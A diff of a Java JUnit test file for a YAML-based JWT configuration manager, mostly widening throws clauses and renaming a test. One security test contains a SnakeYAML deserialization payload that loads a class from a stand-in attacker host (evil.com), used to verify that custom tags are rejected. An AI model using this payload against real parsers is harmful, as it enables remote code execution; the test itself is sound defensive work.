@@ -23,7 +23,6 @@ import org.junit.jupiter.api.*;
 import org.junit.jupiter.api.io.TempDir;
 
 import java.io.File;
-import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Map;
@@ -61,7 +60,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void loadYamlConfiguration() throws IOException {
+    void loadYamlConfiguration() throws Exception {
         // Create a test YAML file
         String yamlContent = """
             jwt:
@@ -114,7 +113,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void loadYamlConfigurationWithoutIds() throws IOException {
+    void loadYamlConfigurationWithoutIds() throws Exception {
         // Create a test YAML file without explicit IDs
         String yamlContent = """
             jwt:
@@ -146,7 +145,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void loadNestedYamlConfiguration() throws IOException {
+    void loadNestedYamlConfiguration() throws Exception {
         // Create a test YAML file with nested structure
         String yamlContent = """
             jwt:
@@ -177,7 +176,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void emptyYamlFile() throws IOException {
+    void emptyYamlFile() throws Exception {
         // Create an empty YAML file
         File yamlFile = tempDir.resolve("empty.yml").toFile();
         Files.writeString(yamlFile.toPath(), "");
@@ -192,7 +191,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void invalidYamlFile() throws IOException {
+    void invalidYamlFile() throws Exception {
         // Create an invalid YAML file
         String invalidYaml = """
             jwt:
@@ -216,7 +215,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void yamlReload() throws IOException {
+    void yamlReload() throws Exception {
         // Create initial YAML file
         String initialYaml = """
             jwt:
@@ -255,7 +254,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void alternativeYamlStructure() throws IOException {
+    void alternativeYamlStructure() throws Exception {
         // Test with a flatter YAML structure
         String yamlContent = """
             issuers:
@@ -293,7 +292,7 @@ class ConfigurationManagerTest {
 
         @Test
         @DisplayName("Should reject YAML with custom tags (deserialization attack)")
-        void shouldRejectYamlWithCustomTags() throws IOException {
+        void shouldRejectYamlWithCustomTags() throws Exception {
             // YAML containing a custom tag that could trigger arbitrary object instantiation
             String maliciousYaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com\"]]]]";
 
@@ -312,7 +311,7 @@ class ConfigurationManagerTest {
 
         @Test
         @DisplayName("Should load simple types with SafeConstructor (regression)")
-        void shouldLoadSimpleTypesWithSafeConstructor() throws IOException {
+        void shouldLoadSimpleTypesWithSafeConstructor() throws Exception {
             // Standard YAML with strings, numbers, lists — should still work
             String safeYaml = """
                 jwt:
@@ -347,7 +346,7 @@ class ConfigurationManagerTest {
     }
 
     @Test
-    void testIssuerPropertiesWithNullValues() throws IOException {
+    void issuerPropertiesWithNullValues() throws Exception {
         // Test handling of null values in issuer configuration
         String yamlContent = """
             jwt:
